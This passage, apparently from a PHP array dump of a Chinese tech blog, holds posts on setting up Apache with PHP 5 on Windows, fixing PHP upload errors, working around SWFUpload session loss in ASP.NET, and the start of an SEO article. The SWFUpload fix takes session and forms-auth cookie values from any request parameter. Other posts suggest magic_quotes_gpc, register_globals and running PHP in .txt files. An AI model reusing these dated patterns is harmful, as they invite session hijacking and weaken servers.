宋体\\">这里有一个选择配置选项，以前可能要配置，现在好像修正过来了，不用配置了，就是强制所有输出文件的语言编码，</span>html<span style=\\"font-family: 宋体\\">文件里有语言标记（，这个就是设定文档语言为</span>gb2312<span style=\\"font-family: 宋体\\">）的也会强制转换。如果打开的网页出现乱码，请先检查网页内有没有上述</span> html<span style=\\"font-family: 宋体\\">语言标记，如果没有，添加上去就能正常显示了。把“</span>#DefaultLanguage nl<span style=\\"font-family: 宋体\\">”前面的“</span># <span style=\\"font-family: 宋体\\">”去掉，把“</span>nl<span style=\\"font-family: 宋体\\">”改成你要强制输出的语言，中文是“</span>zh-cn<span style=\\"font-family: 宋体\\">”，保存，关闭。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090220.gif\\" height=\\"365\\" width=\\"435\\"/></span></p><p><span style=\\"font-family: 宋体\\">&nbsp;&nbsp;&nbsp; 简单的</span>Apache<span style=\\"font-family: 宋体\\">配置就到此结束了，现在利用先前的小图标重启动，所有的配置就生效了，你的网站就成了一个网站服务器，如果你加载了防火墙，请打开</span>80<span style=\\"font-family: 宋体\\">或</span>8080<span style=\\"font-family: 宋体\\">端口，或者允许</span>Apache<span style=\\"font-family: 宋体\\">程序访问网络，否则别人不能访问。</span></p><p><span style=\\"font-family: 宋体\\"><span style=\\"font-family: 宋体\\">二、</span>php<span style=\\"font-family: 宋体\\">的安装、以</span>module<span style=\\"font-family: 宋体\\">方式，将</span>php<span style=\\"font-family: 宋体\\">与</span>apache<span style=\\"font-family: 宋体\\">结合使你的网站服务器支持</span>php<span style=\\"font-family: 宋体\\">服务器脚本程序</span></span></p><p><span style=\\"font-family: 宋体\\">将下载的</span>php<span style=\\"font-family: 宋体\\">安装文件</span>php-5.0.5-Win32.zip<span style=\\"font-family: 宋体\\">右键解压缩。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130931.gif\\" height=\\"306\\" width=\\"230\\"/></span></p><p><span style=\\"font-family: 宋体\\">指定解压缩的位置，我的设定在“</span>D:\\\\php<span style=\\"font-family: 宋体\\">”</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130932.gif\\" height=\\"433\\" width=\\"490\\"/></span></p><p><span style=\\"font-family: 宋体\\">查看解压缩后的文件夹内容，找到“</span>php.ini-dist<span style=\\"font-family: 宋体\\">”文件，将其重命名为“</span>php.ini<span style=\\"font-family: 宋体\\">”，打开编辑，找到下面图中的地方，</span> Ln385<span style=\\"font-family: 宋体\\">，有一个“</span>register_globals = Off<span style=\\"font-family: 宋体\\">”值，这个值是用来打开全局变量的，比如表单送过来的值，如果这个值设为“</span>Off<span style=\\"font-family: 宋体\\">”，就只能用“</span>$_POST[&#39;<span style=\\"font-family: 宋体\\">变量名</span>&#39;]<span style=\\"font-family: 宋体\\">、</span>$_GET[&#39;<span style=\\"font-family: 宋体\\">变量名</span> &#39;]<span style=\\"font-family: 宋体\\">”等来取得送过来的值，如果设为“</span>On<span style=\\"font-family: 宋体\\">”，就可以直接使用“</span>$<span style=\\"font-family: 宋体\\">变量名”来获取送过来的值，当然，设为“</span>Off<span style=\\"font-family: 宋体\\">”就比较安全，不会让人轻易将网页间传送的数据截取。这个值是否改成“</span>On<span style=\\"font-family: 宋体\\">”就看自己感觉了，是安全重要还是方便重要？</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130933.gif\\" height=\\"365\\" width=\\"431\\"/></span></p><p><span style=\\"font-family: 宋体\\">这里还有一个地方要编辑，功能就是使</span>php<span style=\\"font-family: 宋体\\">能够直接调用其它模块，比如访问</span>mysql<span style=\\"font-family: 宋体\\">，如下图所示，</span>Ln563<span style=\\"font-family: 宋体\\">，选择要加载的模块，去掉前面的</span> <span style=\\"font-family: 宋体\\">“</span>;<span style=\\"font-family: 宋体\\">”，就表示要加载此模块了，加载的越多，占用的资源也就多一点，不过也多不到哪去，比如我要用</span>mysql<span style=\\"font-family: 宋体\\">，就要把“</span>;extension= php_mysql.dll<span style=\\"font-family: 宋体\\">”前的“</span>;<span style=\\"font-family: 宋体\\">”去掉。所有的模块文件都放在</span>php<span style=\\"font-family: 宋体\\">解压缩目录的“</span>ext<span style=\\"font-family: 宋体\\">”之下，我</span><span style=\\"font-family: 宋体\\">这里的截图是把所有能加载的模块都加载上去了，前面的“</span>;<span style=\\"font-family: 宋体\\">”没去掉的，是因为“</span>ext<span style=\\"font-family: 宋体\\">”目录下默认没有此模块，加载会提示找不到文件而出错。这里只是参考，一般不需要加载这么多，需要的加载上就可以了，编辑好后保存，关闭。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130934.gif\\" height=\\"739\\" width=\\"429\\"/></span></p><p><span style=\\"font-family: 宋体\\">如果上一步加载了其它模块，就要指明模块的位置，否则重启</span>Apache<span style=\\"font-family: 宋体\\">的时候会提示“找不到指定模块”的错误，这里介绍一种最简单的方法，直接将</span>php<span style=\\"font-family: 宋体\\">安装路径、里面的</span>ext<span style=\\"font-family: 宋体\\">路径指定到</span>windows<span style=\\"font-family: 宋体\\">系统路径中——在“我的电脑”上右键，“属性”，选择“高级”标签，点选“环境变量”，在“系统变量”下找到“</span>Path<span style=\\"font-family: 宋体\\">”变量，选择，双击或点击“编辑”，将</span><span style=\\"font-family: 宋体\\">“</span>;D:\\\\php;D:\\\\php\\\\ext<span style=\\"font-family: 宋体\\">”加到原有值的后面，当然，其中的“</span>D:\\\\php<span style=\\"font-family: 宋体\\">”</span> <span style=\\"font-family: 宋体\\">是我的安装目录，你要将它改为自己的</span>php<span style=\\"font-family: 宋体\\">安装目录，如下图所示，全部确定。系统路径添加好后要重启电脑才能生效，可以现在重启，也可以在所有软件安装或配置好后重启。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130935.gif\\" height=\\"496\\" width=\\"632\\"/></span></p><p><span style=\\"font-family: 宋体\\">现在开始将</span>php<span style=\\"font-family: 宋体\\">以</span>module<span style=\\"font-family: 宋体\\">方式与</span>Apache<span style=\\"font-family: 宋体\\">相结合，使</span>php<span style=\\"font-family: 宋体\\">融入</span>Apache<span style=\\"font-family: 宋体\\">，照先前的方法打开</span>Apache<span style=\\"font-family: 宋体\\">的配置文件，</span>Ln 173<span style=\\"font-family: 宋体\\">，找到这里，添加进如图所示选中的两行，第一行“</span>LoadModule php5_module D:/php/php5apache2.dll<span style=\\"font-family: 宋体\\">”是指以</span>module<span style=\\"font-family: 宋体\\">方式加载</span>php<span style=\\"font-family: 宋体\\">，第二行“</span>PHPIniDir &quot;D:/php&quot;<span style=\\"font-family: 宋体\\">”是指明</span>php<span style=\\"font-family: 宋体\\">的配置文件</span>php.ini<span style=\\"font-family: 宋体\\">的位置，是当然，其中的“</span>D:/php<span style=\\"font-family: 宋体\\">”要改成你先前选择的</span>php<span style=\\"font-family: 宋体\\">解压缩的目录。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130936.gif\\" height=\\"366\\" width=\\"431\\"/></span></p><p><span style=\\"font-family: 宋体\\">还是</span>Apache<span style=\\"font-family: 宋体\\">的配置文件，</span>Ln 757<span style=\\"font-family: 宋体\\">，加入“</span>AddType application/x-httpd-php .php<span style=\\"font-family: 宋体\\">”、“</span>AddType application/x-httpd-php .html<span style=\\"font-family: 宋体\\">”两行，你也可以加入更多，实质就是添加可以执行</span>php<span style=\\"font-family: 宋体\\">的文件类型，比如你再加上一行“</span>AddType application/x-httpd-php .htm<span style=\\"font-family: 宋体\\">”，则</span>.htm<span style=\\"font-family: 宋体\\">文件也可以执行</span>php<span style=\\"font-family: 宋体\\">程序了，你甚至还可以添加上一行“</span>AddType application/x-httpd-php .txt<span style=\\"font-family: 宋体\\">”，让普通的文本文件格式也能运行</span>php<span style=\\"font-family: 宋体\\">程序。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130937.gif\\" height=\\"362\\" width=\\"430\\"/></span></p><p><span style=\\"font-family: 宋体\\">前面所说的目录默认索引文件也可以改一下，因为现在加了</span>php<span style=\\"font-family: 宋体\\">，有些文件就直接存为</span>.php<span style=\\"font-family: 宋体\\">了，我们也可以把“</span>index.php<span style=\\"font-family: 宋体\\">”设为默认索引文件，优先顺序就自己排了，我的是放在第一位。编辑完成，保存，关闭。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/20130938.gif\\" height=\\"365\\" width=\\"431\\"/></span></p><p><span style=\\"font-family: 宋体\\">&nbsp;&nbsp; 现在，</span>php<span style=\\"font-family: 宋体\\">的安装，与</span>Apache<span style=\\"font-family: 宋体\\">的结合已经全部完成，用屏幕右下角的小图标重启</span>Apache<span style=\\"font-family: 宋体\\">，你的</span>Apache<span style=\\"font-family: 宋体\\">服务器就支持了</span>php<span style=\\"font-family: 宋体\\">。在</span>windows<span style=\\"font-family: 宋体\\">下配置搭建</span>Apache+php<span style=\\"font-family: 宋体\\">环境就此大功告成。</span></p></span></p>',
            'keyword' => 'windows,php,环境,搭建',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:29:22',
          ),
          32 => 
          array (
            'id' => '53',
            'uid' => '1',
            'title' => '解决PHP上传is_uploaded_file的tmp_name错误',
            'content' => '<p>&nbsp;&nbsp;&nbsp;&nbsp;今天帮朋友配置一个PHP的程序，里面有一些上传图片的功能，统统的不能用了，上传的时候提示没有此文件或者文件格式不正确。</p><p>icech查看了一下代码，发现是在<br/>!move_uploaded_file($_FILES[&#39;upphoto&#39;][&#39;tmp_name&#39;]<br/>这里返回的是false值</p><p>查看了半天终于解决了这个问题。下面icech说说自己解决的思路。</p><p><strong>1、临时文件权限的问题</strong></p><p>因为朋友的服务器是IIS里面配置的PHP，所以要考虑到权限的问题。</p><p>找到PHP安装目录中php.ini文件，查找upload_tmp_dir，里面的值为“&quot;C:\\\\temp”。配置这个目录的权限，就是将IIS的匿名访问用户的可写和修改权限付给这个目录。</p><p><strong>2、返回路径的问题</strong></p><p>还是php.ini文件的配置问题，找到magic_quotes_gpc一项，如果是Off就改成On。因为打开了magic_quotes_gpc参数的PHP环境会自动对GET/POST/Cookie添加addslashes效果。</p><p>基本检查这两点就可以了，因为icech也是初学PHP，所以不能提供更高深的解释:-) 我们共同研究吧。<br/>bool is_uploaded_file ( string $filename )</p><p><br/></p>',
            'keyword' => ',is_uploaded_file,tmp_name,上传',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:28:42',
          ),
          33 => 
          array (
            'id' => '52',
            'uid' => '1',
            'title' => '解决SWFUpload在Chrome、Firefox等浏览器下的问题',
            'content' => '&nbsp;&nbsp;&nbsp;&nbsp;SWFUpload 是一个非常不错的异步上传组件，但是在Chrome、Firefox等浏览器下使用的时候会有问题。问题如下：为了防止跳过上传页面直接向“接受 SWFUpload上传的一般处理程序”（假如是Upload.ashx）发送请求造成WebShell漏洞，我的系统中对于Upload.ashx进行 了权限控制，只有登录用户才能进行上传。在IE下没问题，但是在Chrome下运行报错“用户未登录”。<br/><p><br/>&nbsp;&nbsp;&nbsp;&nbsp;经过搜索得知：因为SWFUpload是靠Flash进行上传的，Flash在IE下会把当前页面的Cookie发到Upload.ashx，但是Chrome、Firefox下则不会把当前页面的Cookie发到Upload.ashx。因为Session是靠Cookie中保存的SessionId实现的，这样由于当前页面的Cookie不会传递给Flash请求的Upload.ashx，因此请求的文件发送到Upload.ashx就是一个新的Session了，当然这个Session就是没有登录的了。<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;解决这个问题的思路也很简单，那就是手动把SessionId传递给服务器，再服务器端读出SessionId再加载Session。其实解决问题的办法SWFUpload的Demo中已经给出了，那就是在SWFUpload的构造函数中设置post_params参数：</p><pre class=\\"brush:html;toolbar:false\\">swfu&nbsp;=&nbsp;new&nbsp;SWFUpload({
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Backend&nbsp;Settings
&nbsp;&nbsp;&nbsp;&nbsp;upload_url:&nbsp;&quot;/Upload.ashx&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;post_params:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;ASPSESSID&quot;:&nbsp;&quot;&lt;%=Session.SessionID&nbsp;%&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;},</pre><p>post_params中设定的键值对将会以Form表单的形式传递到Upload.ashx，也就是SWFUpload提供了为请求增加自定义请求参数的接口。<br/>&nbsp;<br/>上面的代码把当前页面的SessionId写到ASPSESSID值中，当用户上传文件后，ASPSESSID就会传递到服务器上了，在Global.asax的Application_BeginRequest中添加如下代码：</p><pre class=\\"brush:php;toolbar:false\\">var&nbsp;Request&nbsp;=&nbsp;HttpContext.Current.Request;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;Response&nbsp;=&nbsp;HttpContext.Current.Response;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Fix&nbsp;for&nbsp;the&nbsp;Flash&nbsp;Player&nbsp;Cookie&nbsp;bug&nbsp;in&nbsp;Non-IE&nbsp;browsers.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Since&nbsp;Flash&nbsp;Player&nbsp;always&nbsp;sends&nbsp;the&nbsp;IE&nbsp;cookies&nbsp;even&nbsp;in&nbsp;FireFox
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;we&nbsp;have&nbsp;to&nbsp;bypass&nbsp;the&nbsp;cookies&nbsp;by&nbsp;sending&nbsp;the&nbsp;values&nbsp;as&nbsp;part&nbsp;of&nbsp;the&nbsp;POST&nbsp;or&nbsp;GET
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;and&nbsp;overwrite&nbsp;the&nbsp;cookies&nbsp;with&nbsp;the&nbsp;passed&nbsp;in&nbsp;values.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;The&nbsp;theory&nbsp;is&nbsp;that&nbsp;at&nbsp;this&nbsp;point&nbsp;(BeginRequest)&nbsp;the&nbsp;cookies&nbsp;have&nbsp;not&nbsp;been&nbsp;read&nbsp;by
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;the&nbsp;Session&nbsp;and&nbsp;Authentication&nbsp;logic&nbsp;and&nbsp;if&nbsp;we&nbsp;update&nbsp;the&nbsp;cookies&nbsp;here&nbsp;we&#39;ll&nbsp;get&nbsp;our
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Session&nbsp;and&nbsp;Authentication&nbsp;restored&nbsp;correctly
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string&nbsp;session_param_name&nbsp;=&nbsp;&quot;ASPSESSID&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string&nbsp;session_cookie_name&nbsp;=&nbsp;&quot;ASP.NET_SESSIONID&quot;;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(HttpContext.Current.Request.Form[session_param_name]&nbsp;!=&nbsp;null)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UpdateCookie(session_cookie_name,&nbsp;HttpContext.Current.Request.Form[session_param_name]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(HttpContext.Current.Request.QueryString[session_param_name]&nbsp;!=&nbsp;null)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UpdateCookie(session_cookie_name,&nbsp;HttpContext.Current.Request.QueryString[session_param_name]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch&nbsp;(Exception)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response.StatusCode&nbsp;=&nbsp;500;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response.Write(&quot;Error&nbsp;Initializing&nbsp;Session&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>其中UpdateCookie方法的定义如下：</p><pre class=\\"brush:php;toolbar:false\\">static&nbsp;void&nbsp;UpdateCookie(string&nbsp;cookie_name,&nbsp;string&nbsp;cookie_value)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpCookie&nbsp;cookie&nbsp;=&nbsp;HttpContext.Current.Request.Cookies.Get(cookie_name);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(cookie&nbsp;==&nbsp;null)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie&nbsp;=&nbsp;new&nbsp;HttpCookie(cookie_name);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//SWFUpload&nbsp;的Demo中给的代码有问题，需要加上cookie.Expires&nbsp;设置才可以
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.Expires&nbsp;=&nbsp;DateTime.Now.AddYears(1);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpContext.Current.Request.Cookies.Add(cookie);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.Value&nbsp;=&nbsp;cookie_value;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpContext.Current.Request.Cookies.Set(cookie);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>原理：当用户请求到达ASP.Net引擎的时候Application_BeginRequest方法首先被调用，在方法中看客户端是否提交上来了ASPSESSID，如果有的话则把ASPSESSID的值写入Cookie（以&quot;ASP.NET_SESSIONID&quot;为Key，因为ASP.Net中SessionId就是保存在&quot;ASP.NET_SESSIONID&quot;为Key的Cookie中的），Application_BeginRequest方法后就可以从Cookie中读取到&quot;ASP.NET_SESSIONID&quot;的值还原出页面的Session了。<br/><br/>如果网站中还用到了Membership的FormsAuthentication验证，则还需要把AUTHID也按照SessionID的方法进行处理，这一点是其他讲到SWFUpload这个Bug处理的文章中没有提到的。<br/><br/>在SWFUpload的构造函数中设置post_params参数：</p><pre class=\\"brush:php;toolbar:false\\">swfu&nbsp;=&nbsp;new&nbsp;SWFUpload({
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Backend&nbsp;Settings
&nbsp;&nbsp;&nbsp;&nbsp;upload_url:&nbsp;&quot;/AdminHT/UploadArticleImg.ashx&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;post_params:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;ASPSESSID&quot;:&nbsp;&quot;&lt;%=Session.SessionID&nbsp;%&gt;&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;AUTHID&quot;&nbsp;:&nbsp;&quot;&lt;%=Request.Cookies[FormsAuthentication.FormsCookieName].Value%&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;},</pre><p>在Global.asax的Application_BeginRequest中添加如下代码：</p><pre class=\\"brush:php;toolbar:false\\">try
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string&nbsp;auth_param_name&nbsp;=&nbsp;&quot;AUTHID&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string&nbsp;auth_cookie_name&nbsp;=&nbsp;FormsAuthentication.FormsCookieName;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(HttpContext.Current.Request.Form[auth_param_name]&nbsp;!=&nbsp;null)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UpdateCookie(auth_cookie_name,&nbsp;HttpContext.Current.Request.Form[auth_param_name]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(HttpContext.Current.Request.QueryString[auth_param_name]&nbsp;!=&nbsp;null)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UpdateCookie(auth_cookie_name,&nbsp;HttpContext.Current.Request.QueryString[auth_param_name]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch&nbsp;(Exception)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response.StatusCode&nbsp;=&nbsp;500;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Response.Write(&quot;Error&nbsp;Initializing&nbsp;Forms&nbsp;Authentication&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><br/></p>',
            'keyword' => 'SWFUpload,Chrome,Firefox,浏览器',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:28:00',
          ),
          34 => 
          array (
            'id' => '51',
            'uid' => '1',
            'title' => '（转）影响网站收录不佳的因素',
            'content' => '<p>
	你的网站内容是原创，还是采集?</p><p>
	1、搜索引擎都特别喜欢原创，如果你是采集怎么办?建议你通过良好的布局和内链结构来解决</p><p>
	随着算法的提升，百度在这块已经有了很大程度的提升，伪原创以及转载采集都会成为你网站不被收录的很大一部分原因，所以百优网建议我们在撰写网站内容的时
候，尽可能写原创，即便是可以每天少发几篇(医疗新闻)，效果都会远远要比你伪原创和采集的效果好很多，并且这些内容收录和排名也都是极佳的。</p><p>
	内容的相关度不高</p><p>
	如果你的网站每个栏目内容缺乏相关性，甚至不相干;即使你更新的内容都被收录了，也不会对网站的整体有个好的排名!因为不能很好的突出网站主题，大家都不喜欢风马牛不相及的东西。所以，对于网站收录很多，但是没有排名，也应该重视下你网站的内容相关性如何!</p><p>
	友情链接有被K现象</p><p>
